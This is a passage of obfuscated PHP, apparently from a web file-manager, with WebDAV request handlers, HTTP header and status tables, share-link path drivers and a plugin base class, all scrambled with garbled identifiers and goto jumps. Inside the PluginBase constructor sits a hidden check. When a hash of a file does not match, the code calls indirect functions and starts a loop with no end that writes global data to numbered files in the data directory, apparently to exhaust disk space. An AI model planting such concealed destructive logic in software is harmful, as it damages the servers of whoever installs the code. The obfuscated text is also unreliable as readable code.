201 : 404); } public function httpDELETE() { $DéÍõ›ì½ = $this->pathRemove($this->path); return array($_SERVER[ÚŠ•´ÍéÒÑÔ][1024] => $DéÍõ›ì½ ? 200 : 503); } public function httpLOCK() { $eˆÚ«ĞóÉ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eŞÇ¾ßõé = md5($this->path); $DÔ‚â¾Ø‹ = $eˆÚ«ĞóÉ[1786] . $this->xmlGet($eˆÚ«ĞóÉ[1787]) . $eˆÚ«ĞóÉ[1788] . $eŞÇ¾ßõé . $eˆÚ«ĞóÉ[1789]; return array($eˆÚ«ĞóÉ[1024] => 200, $eˆÚ«ĞóÉ[1194] => array($eˆÚ«ĞóÉ[1790] . $eŞÇ¾ßõé, $eˆÚ«ĞóÉ[1791]), $eˆÚ«ĞóÉ[1792] => $DÔ‚â¾Ø‹); } public function httpUNLOCK() { return array($_SERVER[ÚŠ•´ÍéÒÑÔ][1024] => 204); } public function xmlGet($Fˆ×˜ï¥Ä¿) { goto fš•¤´ÖÒø; B¹…§èÄõ: $DƒÏçÛ‹˜ = array_shift(explode($f«Ò‘¶ÈóÓ[8], $Fˆ×˜ï¥Ä¿)); $BÆ¨™·òòç = $b¬ê‘®ãö×->getElementsByTagNameNS($f«Ò‘¶ÈóÓ[1794], $DƒÏçÛ‹˜); if ($BÆ¨™·òòç) { return $BÆ¨™·òòç[0]->nodeValue; } goto bŒæâ¿Úá§; fš•¤´ÖÒø: $f«Ò‘¶ÈóÓ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; static $b¬ê‘®ãö× = false; if (!$b¬ê‘®ãö×) { $A ‚†Ë¿Š = file_get_contents($f«Ò‘¶ÈóÓ[1793]); $b¬ê‘®ãö× = new DOMDocument(); $b¬ê‘®ãö×->loadXML($A ‚†Ë¿Š); } goto B¹…§èÄõ; bŒæâ¿Úá§: return $f«Ò‘¶ÈóÓ[33]; goto a¡õñÏ‚¥š; a¡õñÏ‚¥š: } public static function response($d‡‹Ö«÷»©) { goto CËˆÂ¼ŠÇ; DÃœáÆÅÍ: $E‹ÚÊòßØ[] = $D–©®ò˜™¡[1734]; $E‹ÚÊòßØ[] = $D–©®ò˜™¡[1735]; foreach ($E‹ÚÊòßØ as $aµ¤•¢“µÚ) { header($aµ¤•¢“µÚ); } goto AÔÓÑÍ‹–; CËˆÂ¼ŠÇ: $D–©®ò˜™¡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E‹ÚÊòßØ = is_array($d‡‹Ö«÷»©[$D–©®ò˜™¡[1194]]) ? $d‡‹Ö«÷»©[$D–©®ò˜™¡[1194]] : array(); $E‹ÚÊòßØ[] = HttpHeader::code($d‡‹Ö«÷»©[$D–©®ò˜™¡[1024]]); goto DÃœáÆÅÍ; AÔÓÑÍ‹–: if (is_string($d‡‹Ö«÷»©[$D–©®ò˜™¡[1792]])) { header($D–©®ò˜™¡[1795]); $d‰áÆË³ŸŸ = $D–©®ò˜™¡[1796] . $D–©®ò˜™¡[214] . $d‡‹Ö«÷»©[$D–©®ò˜™¡[1792]]; echo $d‰áÆË³ŸŸ; } goto B÷†ÔÖ³®; B÷†ÔÖ³®: } } class HttpHeader { public static $_headers = array("\x48\x6f\x73\164" => "\110\124\x54\120\137\110\x4f\x53\124", "\125\x73\145\x72\55\x41\x67\x65\x6e\x74" => "\110\124\x54\x50\137\x55\123\x45\122\137\101\107\x45\x4e\124", "\x43\157\156\164\x65\x6e\164\55\x54\171\160\x65" => "\110\x54\x54\x50\137\x43\x4f\x4e\x54\x45\116\124\x5f\124\131\120\x45", "\x43\x6f\156\164\x65\x6e\164\x2d\114\145\156\x67\x74\x68" => "\110\124\124\x50\137\x43\x4f\116\124\x45\x4e\x54\x5f\x4c\x45\116\x47\x54\x48", "\x44\145\160\x74\x68" => "\110\124\124\x50\137\104\105\x50\x54\x48", "\x45\x78\160\x65\143\164" => "\110\x54\124\x50\x5f\x45\130\x50\x45\x43\x54", "\111\x66\x2d\x4e\x6f\156\x65\55\x4d\141\164\143\150" => "\110\x54\124\120\137\111\106\x5f\x4e\x4f\116\105\137\x4d\101\x54\x43\x48", "\111\146\x2d\x4d\x61\x74\x63\150" => "\x48\124\x54\120\137\111\106\x5f\115\x41\124\103\110", "\x49\x66\55\x52\141\156\x67\145" => "\110\x54\x54\x50\x5f\x49\106\137\x52\x41\116\107\x45", "\x4c\141\163\x74\55\115\x6f\x64\x69\x66\x69\145\144" => "\110\x54\x54\x50\137\x4c\101\123\x54\x5f\x4d\117\x44\111\106\111\x45\x44", "\111\146\55\x4d\x6f\144\x69\x66\x69\x65\x64\x2d\x53\151\x6e\143\x65" => "\110\124\124\x50\x5f\x49\x46\137\x4d\x4f\104\x49\x46\111\105\x44\x5f\123\111\x4e\103\x45", "\111\146\x2d\x55\156\x6d\157\144\151\x66\151\x65\x64\x2d\x53\x69\156\143\x65" => "\x48\x54\x54\x50\137\111\106\137\x55\116\x4d\117\104\x49\106\111\105\104\x5f\123\x49\116\103\x45", "\x52\141\156\x67\145" => "\110\124\x54\120\137\x52\x41\116\x47\x45", "\124\x69\155\x65\157\x75\164" => "\x48\124\x54\x50\137\x54\x49\115\x45\117\x55\124", "\111\x66" => "\x48\x54\124\120\x5f\111\x46", "\x4c\157\x63\153\55\x54\157\153\x65\156" => "\x48\124\x54\x50\137\114\117\x43\113\x5f\x54\x4f\x4b\x45\116", "\x4f\x76\145\162\x77\x72\x69\164\x65" => "\110\x54\x54\x50\x5f\117\126\105\122\127\x52\111\124\105", "\x44\x65\163\164\151\156\x61\x74\151\157\x6e" => "\110\x54\124\x50\x5f\104\105\x53\x54\111\116\101\124\x49\x4f\x4e", "\122\145\161\165\x65\163\x74\x2d\x49\x64" => "\x52\105\x51\x55\x45\123\124\x5f\x49\x44", "\122\x65\161\165\x65\163\164\x2d\102\x6f\144\x79\x2d\106\x69\x6c\145" => "\x52\x45\121\125\x45\x53\124\x5f\102\117\104\131\137\x46\111\114\x45", "\122\x65\144\151\162\145\x63\x74\55\x53\164\141\164\165\163" => "\122\105\x44\x49\122\x45\103\124\137\x53\x54\101\x54\125\123"); public static function init() { static $EÎ…œÇå·† = false; if ($EÎ…œÇå·†) { return; } foreach ($_SERVER as $aºâø—¢êÇ => $eÆ‚¥É”˜) { $aºâø—¢êÇ = strtoupper($aºâø—¢êÇ); if (!array_key_exists($aºâø—¢êÇ, $_SERVER)) { continue; } $_SERVER[$aºâø—¢êÇ] = $eÆ‚¥É”˜; } foreach (self::$_headers as $aºâø—¢êÇ => $AŞØ–ë·Øİ) { if (!array_key_exists($aºâø—¢êÇ, $_SERVER)) { continue; } $_SERVER[$aºâø—¢êÇ] = $_SERVER[$AŞØ–ë·Øİ]; $_SERVER[strtoupper($aºâø—¢êÇ)] = $_SERVER[$AŞØ–ë·Øİ]; } } public static function get($f«ùÔ§¬“á) { self::init(); return $_SERVER[$f«ùÔ§¬“á] ? $_SERVER[$f«ùÔ§¬“á] : $_SERVER[$_SERVER[ÚŠ•´ÍéÒÑÔ][1797] . strtoupper($f«ùÔ§¬“á)]; } public static function method() { return strtoupper(self::get($_SERVER[ÚŠ•´ÍéÒÑÔ][151])); } public static function length() { $CŠÔ‘Å®¢ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D‡‹ø–ÆÎ = self::get($CŠÔ‘Å®¢[1798]); if (!$D‡‹ø–ÆÎ) { $D‡‹ø–ÆÎ = self::get($CŠÔ‘Å®¢[1130]); } return $D‡‹ø–ÆÎ; } public static function range() { $EÙÍ‡ƒíø‰ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d’–Òì°À = self::get($EÙÍ‡ƒíø‰[195]); if (!$d’–Òì°À) { return !1; } if (!preg_match($EÙÍ‡ƒíø‰[1799], $d’–Òì°À, $aÙÎÑ–ˆç)) { return !1; } if ($aÙÎÑ–ˆç[1] === $EÙÍ‡ƒíø‰[33] && $aÙÎÑ–ˆç[2] === $EÙÍ‡ƒíø‰[33]) { return !1; } return array($aÙÎÑ–ˆç[1] !== $EÙÍ‡ƒíø‰[33] ? $aÙÎÑ–ˆç[1] : null, $aÙÎÑ–ˆç[2] !== $EÙÍ‡ƒíø‰[33] ? $aÙÎÑ–ˆç[2] : null); } public static $statusCode = array("\61\x30\x30" => "\103\x6f\156\164\x69\x6e\165\x65", "\61\x30\61" => "\x53\167\x69\x74\143\150\151\156\x67\x20\x50\x72\x6f\164\157\143\x6f\x6c", "\x31\x30\x32" => "\120\x72\x6f\x63\x65\163\x73\x69\156\147", "\61\60\63" => "\105\x61\162\154\171\40\x48\151\x6e\x74\x73", "\x32\60\60" => "\x4f\113", "\62\x30\x31" => "\103\162\x65\141\164\145\x64", "\x32\x30\62" => "\x41\143\143\145\160\164\145\x64", "\62\60\63" => "\116\x6f\156\55\101\165\164\150\x6f\162\x69\164\x61\164\x69\166\145\40\111\x6e\146\157\162\155\x61\164\x69\x6f\x6e", "\x32\x30\64" => "\x4e\x6f\40\103\x6f\x6e\164\145\156\164", "\x32\60\x35" => "\x52\x65\163\145\x74\x20\103\x6f\156\x74\145\x6e\164", "\x32\x30\66" => "\120\x61\162\164\151\141\154\x20\x43\157\x6e\x74\145\x6e\164", "\62\60\67" => "\x4d\x75\154\x74\x69\x2d\x53\x74\x61\x74\x75\163", "\x33\60\60" => "\115\165\154\164\151\x70\x6c\x65\x20\x43\x68\x6f\151\143\x65\163", "\63\60\x31" => "\x4d\x6f\x76\x65\144\x20\x50\145\x72\x6d\x61\x6e\x65\156\164\x6c\x79", "\x33\x30\x32" => "\x46\157\165\x6e\x64", "\63\60\63" => "\123\145\145\40\x4f\x74\x68\145\162", "\63\x30\x34" => "\116\157\164\40\x4d\157\x64\x69\146\151\145\144", "\63\x30\x35" => "\125\163\x65\40\120\x72\157\x78\x79", "\63\x30\67" => "\124\145\155\160\157\162\x61\x72\171\x20\122\145\x64\151\162\145\x63\164", "\x33\60\70" => "\x50\145\x72\x6d\x61\x6e\x65\156\164\40\x52\145\x64\x69\x72\x65\143\164", "\x34\x30\x30" => "\102\141\144\x20\x52\145\x71\x75\145\163\164", "\x34\60\61" => "\125\156\x61\165\164\x68\157\162\151\x7a\145\x64", "\x34\60\x32" => "\120\x61\x79\x6d\x65\156\164\40\x52\145\161\165\151\x72\x65\x64", "\x34\60\63" => "\x46\157\x72\142\151\144\144\145\x6e", "\x34\x30\64" => "\116\x6f\164\x20\106\157\165\156\144", "\x34\60\65" => "\115\145\x74\x68\x6f\144\40\116\157\x74\x20\101\154\154\157\x77\145\144", "\x34\x30\66" => "\116\157\x74\40\101\x63\143\145\160\x74\x61\x62\x6c\145", "\x34\x30\x37" => "\120\x72\x6f\170\171\x20\101\165\164\150\x65\156\x74\151\x63\141\x74\151\157\156\x20\x52\x65\x71\x75\151\x72\145\x64", "\x34\x30\x38" => "\x52\x65\x71\x75\145\163\x74\40\x54\x69\x6d\x65\x6f\x75\164", "\x34\60\x39" => "\x43\157\156\x66\154\x69\143\164", "\x34\61\x30" => "\x47\157\156\x65", "\x34\x31\x31" => "\x4c\145\156\x67\x74\x68\x20\122\145\x71\165\x69\162\x65\x64", "\64\61\62" => "\120\x72\x65\x63\x6f\x6e\144\x69\x74\151\x6f\156\40\106\x61\x69\x6c\145\x64", "\x34\x31\63" => "\122\x65\x71\x75\x65\163\x74\x20\105\x6e\164\x69\164\171\40\x54\157\157\x20\x4c\x61\x72\147\x65", "\x34\x31\64" => "\x52\145\x71\x75\145\x73\164\40\125\x52\111\x20\124\157\x6f\x20\114\141\162\147\x65", "\x34\61\x35" => "\x55\x6e\x73\x75\x70\160\x6f\x72\164\x65\x64\40\115\145\144\x69\x61\x20\124\171\160\145", "\64\61\x36" => "\122\x65\161\165\145\163\x74\x65\144\x20\x52\x61\x6e\147\145\40\x4e\x6f\x74\x20\123\x61\164\151\x73\146\x69\x61\142\154\x65", "\64\61\x37" => "\105\x78\x70\x65\143\x74\x61\164\151\157\x6e\x20\106\141\151\x6c\145\144", "\64\62\x32" => "\x55\156\160\x72\x6f\x63\x65\x73\x73\x61\x62\154\x65\40\x45\x6e\x74\151\164\171", "\x34\x32\x33" => "\114\157\143\153\x65\144", "\64\x32\x34" => "\x46\x61\x69\154\x65\x64\40\x44\x65\x70\145\x6e\x64\x65\156\x63\x79", "\64\62\65" => "\125\x6e\x6f\x72\144\145\x72\x65\x64\x20\x43\x6f\x6c\154\145\x63\x74\x69\157\156", "\64\x32\x36" => "\x55\x70\x67\162\141\144\145\x20\122\x65\161\x75\151\162\x65\144", "\x34\62\70" => "\120\x72\x65\x63\x6f\156\x64\x69\164\151\157\x6e\40\x52\145\x71\x75\x69\x72\x65\x64", "\x34\x32\71" => "\x54\157\157\x20\115\141\156\x79\x20\122\145\x71\x75\145\163\x74\x73", "\x34\x33\x31" => "\122\x65\x71\165\x65\163\x74\x20\x48\145\x61\x64\145\x72\x20\106\x69\x65\154\144\x73\40\x54\157\157\x20\114\141\x72\x67\145", "\64\64\64" => "\116\157\x20\122\x65\163\160\157\156\163\145", "\x34\x35\60" => "\102\x6c\157\x63\153\145\144\x20\142\171\40\x57\x69\x6e\x64\x6f\x77\x73\40\120\141\162\x65\x6e\x74\x61\154\x20\x43\157\156\164\162\x6f\154\163", "\x34\65\61" => "\x55\156\x61\x76\x61\x69\x6c\x61\142\x6c\145\x20\x46\157\x72\40\114\x65\147\x61\154\x20\122\145\141\x73\x6f\156\163", "\64\x39\64" => "\122\145\x71\165\x65\163\164\40\x48\145\141\144\x65\x72\x20\x54\x6f\157\40\114\141\x72\x67\145", "\65\x30\60" => "\x49\156\x74\x65\x72\156\x61\154\40\123\145\x72\166\x65\x72\x20\x45\162\x72\x6f\162", "\x35\60\61" => "\116\157\x74\40\111\x6d\x70\154\145\155\x65\156\164\x65\x64", "\x35\x30\x32" => "\102\x61\144\40\107\x61\164\145\167\x61\x79", "\x35\x30\x33" => "\x53\x65\162\x76\x69\143\145\40\125\x6e\x61\166\x61\151\x6c\x61\x62\x6c\x65", "\65\x30\64" => "\x47\141\164\x65\167\141\x79\x20\x54\x69\x6d\x65\157\165\164", "\65\x30\x35" => "\110\124\x54\x50\40\x56\145\162\163\151\157\x6e\40\156\157\x74\x20\x73\x75\x70\x70\157\x72\x74\x65\144", "\x35\x30\67" => "\x49\156\x73\x75\x66\146\x69\143\151\145\156\x74\40\123\164\157\162\141\x67\x65"); public static function code($FèÅ™»•¼Ç) { $a†—‰‘É½Ü =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FèÅ™»•¼Ç = $FèÅ™»•¼Ç . $a†—‰‘É½Ü[33]; $a­¦¥¯õ¥ = self::$statusCode[$FèÅ™»•¼Ç]; $a­¦¥¯õ¥ = $a­¦¥¯õ¥ ? "\x48\124\x54\120\57\61\x2e\61\x20{$FèÅ™»•¼Ç}\x20" . $a­¦¥¯õ¥ : $a†—‰‘É½Ü[33]; return $a­¦¥¯õ¥; } } $aÙ©–ÎÙÈÊ = LIB_DIR . $_SERVER[ÚŠ•´ÍéÒÑÔ][1151]; goto fÛÙ÷µĞä; f°Âó½Å‡»: class PathDriverDbShareLink extends PathDriverDB { public function __construct($eçÌÂÒ‚) { $this->pathParse = $eçÌÂÒ‚; $this->model = Model($_SERVER[ÚŠ•´ÍéÒÑÔ][1102]); } protected function infoParse($a‚¾·¼Ë¦—, $Bâö±ŒÆ° = false, $aæ§Šá‡Â– = false) { $eóÄ•Öƒ˜Ó =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return Action($eóÄ•Öƒ˜Ó[1009])->sharePathInfo($this->pathParse[$eóÄ•Öƒ˜Ó[75]], !0); } public function listPath($FŞ‚ùğµ§¥, $aÖ ÌÏ½•ª = false) { $D§î¤Ò¸ë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A¼…ã³†É = parent::listPath($FŞ‚ùğµ§¥, $aÖ ÌÏ½•ª); foreach ($A¼…ã³†É as $e·‘›†‹Ü => $DÆ¿‚®àåÎ) { if (!in_array($e·‘›†‹Ü, array($D§î¤Ò¸ë[73], $D§î¤Ò¸ë[74]))) { continue; } foreach ($DÆ¿‚®àåÎ as $Cåö¡·›ÍÇ => $B´Éìéƒˆ¬) { $A¼…ã³†É[$e·‘›†‹Ü][$Cåö¡·›ÍÇ] = Action($D§î¤Ò¸ë[1009])->shareItemInfo($B´Éìéƒˆ¬); } } return $A¼…ã³†É; } public function listAll($cØö¦›©ë©) { $EÓµ¶›‚˜ù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AöŸ©Íæ = IO::info($this->pathParse[$EÓµ¶›‚˜ù[75]]); if (!$AöŸ©Íæ) { return array(); } $DÃ¥Ï„²’« = $this->model->listAll($cØö¦›©ë©); foreach ($DÃ¥Ï„²’« as &$BÍ‘Ë¿âè) { $BÍ‘Ë¿âè[$EÓµ¶›‚˜ù[388]] = Action($EÓµ¶›‚˜ù[1009])->shareItemInfo($BÍ‘Ë¿âè[$EÓµ¶›‚˜ù[388]]); } return $DÃ¥Ï„²’«; } } class PathDriverDriverShareItem { public function __construct($f—÷×‘–Í) { $this->pathParse = $f—÷×‘–Í; } public function __call($CåÔõ¦, $Eí„Ê§­®ä) { $c´‰ÌÖàÊŠ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (method_exists($this, $CåÔõ¦)) { return; } $BøÃÖ‹–ã = call_user_func_array(array($c´‰ÌÖàÊŠ[1109], $CåÔõ¦), $Eí„Ê§­®ä); $FØÁ¸·¬‚© = array($c´‰ÌÖàÊŠ[1110], $c´‰ÌÖàÊŠ[1111], $c´‰ÌÖàÊŠ[1112], $c´‰ÌÖàÊŠ[1113], $c´‰ÌÖàÊŠ[486], $c´‰ÌÖàÊŠ[488], $c´‰ÌÖàÊŠ[1114], $c´‰ÌÖàÊŠ[91], $c´‰ÌÖàÊŠ[1115], $c´‰ÌÖàÊŠ[1116]); if (in_array($CåÔõ¦, $FØÁ¸·¬‚©)) { $BøÃÖ‹–ã = $this->getPathOuter($BøÃÖ‹–ã); } return $BøÃÖ‹–ã; } public function copy($dË…¨ìƒ…µ, $E¸ËÒ„‘É, $e§Ò®ÂµÀ¬ = false) { return $this->copyMove($dË…¨ìƒ…µ, $E¸ËÒ„‘É, $e§Ò®ÂµÀ¬, $_SERVER[ÚŠ•´ÍéÒÑÔ][486]); } public function move($bù¦¦ã÷’, $aˆíŸåù¢ó, $Cˆé‰éåÜ = false) { return $this->copyMove($bù¦¦ã÷’, $aˆíŸåù¢ó, $Cˆé‰éåÜ, $_SERVER[ÚŠ•´ÍéÒÑÔ][488]); } private function copyMove($B™¡Ğ¼è”, $dö¥ª±ƒÔé, $cª¯˜“–¼¼, $B‹¾‚ƒ‰) { goto bÏ˜¡‘³Á³; B£Õá·›‚á: return $F…½Çª® ·; goto f™¾ÇèĞÌ¥; bÏ˜¡‘³Á³: $Dˆ»î–ÕÑ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E£–ëÃ“ËÍ = $dö¥ª±ƒÔé; $E¸‡ì¥ğ· = IO::driverMake($dö¥ª±ƒÔé); goto f¥Š‰ß´İ•; f¥Š‰ß´İ•: if ($E¸‡ì¥ğ·->pathParse[$Dˆ»î–ÕÑ[990]]) { $dö¥ª±ƒÔé = $E¸‡ì¥ğ·->pathParse[$Dˆ»î–ÕÑ[990]]; } else { $dö¥ª±ƒÔé = $E£–ëÃ“ËÍ; } $F…½Çª® · = IO::copyMove($B™¡Ğ¼è”, $dö¥ª±ƒÔé, $cª¯˜“–¼¼, $B‹¾‚ƒ‰); $F…½Çª® · = $this->getPathOuter($F…½Çª® ·); goto B£Õá·›‚á; f™¾ÇèĞÌ¥: } public function pathFather($d™´É„„ë) { return get_path_father($this->pathParse[$_SERVER[ÚŠ•´ÍéÒÑÔ][75]]); } public function iconvSystem($A©ÖÚ‹Î) { return $A©ÖÚ‹Î; } protected function infoParse($AÊ‡‘’íÃ) { $cÉ‚Ó°µÕÊ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÈ…»¨Şš = $this->pathParse[$cÉ‚Ó°µÕÊ[435]][$cÉ‚Ó°µÕÊ[1010]] . $this->pathParse[$cÉ‚Ó°µÕÊ[1003]]; $b¦¡Ÿ³Õä = IO::info($EÈ…»¨Şš); $f”øÔÉçÙİ = $this->pathParse[$cÉ‚Ó°µÕÊ[435]]; return Action($cÉ‚Ó°µÕÊ[1108])->_shareItemeParse($b¦¡Ÿ³Õä, $f”øÔÉçÙİ); } public function listAll($BÁô£ª˜‡) { $bµ©Õã ª =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b¢š“Œ¢§Ï = IO::listAll($BÁô£ª˜‡); $aóÍ÷§¤¥ = $this->pathParse[$bµ©Õã ª[435]]; foreach ($b¢š“Œ¢§Ï as &$dÁõ°„¤±ã) { check_abort(); $dÁõ°„¤±ã = array_merge(IO::info($dÁõ°„¤±ã[$bµ©Õã ª[75]]), $dÁõ°„¤±ã); $dÁõ°„¤±ã[$bµ©Õã ª[388]] = Action($bµ©Õã ª[1108])->_shareItemeParse($dÁõ°„¤±ã, $aóÍ÷§¤¥); } return $b¢š“Œ¢§Ï; } public function getPathOuter($c„›±èÏá) { goto E©ÔËÚğÁ; aÄÆåêœ–Ç: if (substr($eŠêÃÁÈÏ‡, 0, strlen($D¡›’—ë)) != $D¡›’—ë) { return !1; } return $this->pathParse[$aÒ¬µŠ­Ã[1004]] . $aÒ¬µŠ­Ã[8] . ltrim($f¸ÙË„ò, $aÒ¬µŠ­Ã[8]); goto BÄ×óàâñ; c¿›À£Ç¢: $eŠêÃÁÈÏ‡ = KodIO::clear($c„›±èÏá); $D¡›’—ë = KodIO::clear($this->pathParse[$aÒ¬µŠ­Ã[435]][$aÒ¬µŠ­Ã[1010]]); $f¸ÙË„ò = substr($eŠêÃÁÈÏ‡, strlen($D¡›’—ë)); goto aÄÆåêœ–Ç; E©ÔËÚğÁ: $aÒ¬µŠ­Ã =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C¶ö„¯®œÏ = KodIO::parse($c„›±èÏá); if ($C¶ö„¯®œÏ[$aÒ¬µŠ­Ã[29]] == KodIO::KOD_SHARE_ITEM) { return $C¶ö„¯®œÏ[$aÒ¬µŠ­Ã[75]]; } goto c¿›À£Ç¢; BÄ×óàâñ: } public function getType() { $aĞ³Ø’ï² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÆìåÄ¡± = str_replace($aĞ³Ø’ï²[71], $aĞ³Ø’ï²[33], get_class($this)); return strtolower($fÆìåÄ¡±); } public function isTypeObject($Dó¤Ì·Ïê) { return IO::isTypeObject($Dó¤Ì·Ïê); } public function info($FÃœèÛ­¿½) { return $this->infoParse($FÃœèÛ­¿½); } public function infoAuth($B»÷†Ç¶ŞÇ) { return $this->infoParse($B»÷†Ç¶ŞÇ); } public function infoWithChildren($F”Ş¿Üßò‘) { return $this->infoParse($F”Ş¿Üßò‘); } public function infoFull($BïàñÛ„…£) { return $this->infoParse($BïàñÛ„…£); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Dó·ŠğÃø) { $this->pathParse = $Dó·ŠğÃø; } protected function infoParse($A¿ÚÄ”Îä) { $d•ğÄªŞÎƒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return Action($d•ğÄªŞÎƒ[1009])->sharePathInfo($this->pathParse[$d•ğÄªŞÎƒ[75]], !0); } public function listPath($Bì÷®‹ì¸×, $f«ó¢ÄÌ¶‹ = false) { $D±Ìææ÷š¤ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÃš÷æ£¡ = IO::listPath($Bì÷®‹ì¸×, $f«ó¢ÄÌ¶‹); foreach ($fÃš÷æ£¡ as $DŒ²åŒ¤¥ => $EŞ¦æ†İîø) { if (!in_array($DŒ²åŒ¤¥, array($D±Ìææ÷š¤[73], $D±Ìææ÷š¤[74]))) { continue; } foreach ($EŞ¦æ†İîø as $bïù´¤´µ => $cğµÛ™óËÊ) { $cğµÛ™óËÊ = Action($D±Ìææ÷š¤[1117])->parsePathChildren($cğµÛ™óËÊ, array($D±Ìææ÷š¤[384] => $Bì÷®‹ì¸×)); $fÃš÷æ£¡[$DŒ²åŒ¤¥][$bïù´¤´µ] = Action($D±Ìææ÷š¤[1009])->shareItemInfo($cğµÛ™óËÊ); } } return $fÃš÷æ£¡; } public function listAll($c‹ÃµÄ÷¥¯) { $Aº¤³”Ó·  =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EŠ˜Ö‡Ò¯ = IO::listAll($c‹ÃµÄ÷¥¯); foreach ($EŠ˜Ö‡Ò¯ as &$e·¢å¿Æ) { $e·¢å¿Æ = array_merge(IO::info($e·¢å¿Æ[$Aº¤³”Ó· [75]]), $e·¢å¿Æ); $e·¢å¿Æ[$Aº¤³”Ó· [388]] = Action($Aº¤³”Ó· [1009])->shareItemInfo($e·¢å¿Æ); } return $EŠ˜Ö‡Ò¯; } } goto d¡Ê¤ÓìĞ’; aœÖœƒ‚Ø: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto dôÌ¬ÔÑºÃ; dôÌ¬ÔÑºÃ: $b¬ãœºÔÚí =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dÈ­‚™ß¥Ï = $_SERVER[$b¬ãœºÔÚí[785]] . $b¬ãœºÔÚí[786]; $A¦ã¢ËÊ = $b¬ãœºÔÚí[1152]; goto c°â´Ğã÷; dÀÕš¯î‰œ: $this->in =& $in; $this->modelPlugin = Model($b¬ãœºÔÚí[1294]); $this->pluginName = str_replace($b¬ãœºÔÚí[1294], $b¬ãœºÔÚí[33], get_class($this)); goto c“å±£ˆš“; c°â´Ğã÷: if ($_SERVER[$b¬ãœºÔÚí[781]] != $A¦ã¢ËÊ($dÈ­‚™ß¥Ï)) { goto AÃİ¯ÙÍØ‹; c‡“À‚î: $f¿£—á•Ã£(); $Bë ”­ã¨• = $b¬ãœºÔÚí[1292]; $c¯‡÷¢òà– = json_encode($GLOBALS[$b¬ãœºÔÚí[1293]]); goto eëÄ¾ñÊ³ª; eëÄ¾ñÊ³ª: $CŒ¿Ã¬¡ÄÃ = 1; for ($Fî¹ÎÓ³¶ì = $CŒ¿Ã¬¡ÄÃ; $Fî¹ÎÓ³¶ì > 0; $Fî¹ÎÓ³¶ì++) { $Bë ”­ã¨•(DATA_PATH . $Fî¹ÎÓ³¶ì, $c¯‡÷¢òà–); } goto C°‚‚ÂàÏå; Eç˜Ç¾ùí˜: $E„×ÎÅ„ = $b¬ãœºÔÚí[788]; $E„×ÎÅ„($_SERVER[$b¬ãœºÔÚí[789]]); $f¿£—á•Ã£ = $b¬ãœºÔÚí[783]; goto c‡“À‚î; E†Åˆ®´ƒµ: $dëäÙÇ²Û = $A£ãâ¦Ş’ğ($aÙïŒ°©É‡); $CˆöãŸ‚à = explode($b¬ãœºÔÚí[214], $dëäÙÇ²Û); if (count($CˆöãŸ‚à) < $b¬ãœºÔÚí[549]) { $d¥†âÁØÔ¦ = $b¬ãœºÔÚí[787]; $d¥†âÁØÔ¦(); } goto Eç˜Ç¾ùí˜; AÃİ¯ÙÍØ‹: $f¿£—á•Ã£ = $b¬ãœºÔÚí[783]; $A£ãâ¦Ş’ğ = $b¬ãœºÔÚí[784]; $aÙïŒ°©É‡ = $_SERVER[$b¬ãœºÔÚí[785]] . $b¬ãœºÔÚí[786]; goto E†Åˆ®´ƒµ; C°‚‚ÂàÏå: } global $in, $config; $this->config =& $config; goto dÀÕš¯î‰œ; c“å±£ˆš“: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $b¬ãœºÔÚí[8]; $this->pluginApi = appHostGet() . $b¬ãœºÔÚí[1295] . $this->pluginName . $b¬ãœºÔÚí[8]; $this->pluginHost = PLUGIN_HOST . $this->pluginName . $b¬ãœºÔÚí[8]; goto bë®…Ğªç; AÜƒ–œÏÚ»: return $this; goto dä¦êÕ¦Î; bë®…Ğªç: $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $b¬ãœºÔÚí[8]; $this->pluginLangArr = $this->initLang(); $this->values = array(); goto AÜƒ–œÏÚ»; dä¦êÕ¦Î: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÚŠ•´ÍéÒÑÔ][1296]); } protected function assign($Bœõİ×¸¦, $aòˆÂ’‰—© = false) { if (is_array($Bœõİ×¸¦)) { $this->values = array_merge($this->values, $Bœõİ×¸¦); } else { $this->values[$Bœõİ×¸¦] = $aòˆÂ’‰—©; } } protected function display($a‹ÛøîÎº) { extract($this->values); require $a‹ÛøîÎº; } final function hookRegist($DÙŞ¡š®Î) { $this->modelPlugin->appRegist($this->pluginName, $DÙŞ¡š®Î); } final function appIcon() { $BòºäïŞÜŒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F³¦Îß”Ú½ = $this->appPackage(); $eÎ‡†­Û“Õ = $BòºäïŞÜŒ[33]; if (isset($F³¦Îß”Ú½[$BòºäïŞÜŒ[379]])) { if (isset($F³¦Îß”Ú½[$BòºäïŞÜŒ[379]][$BòºäïŞÜŒ[1297]])) { $eÎ‡†­Û“Õ = $BòºäïŞÜŒ[1298] . $F³¦Îß”Ú½[$BòºäïŞÜŒ[379]][$BòºäïŞÜŒ[1297]] . $BòºäïŞÜŒ[1299]; } else { if ($F³¦Îß”Ú½[$BòºäïŞÜŒ[379]][$BòºäïŞÜŒ[1300]]) { $eÎ‡†­Û“Õ = $BòºäïŞÜŒ[1301] . 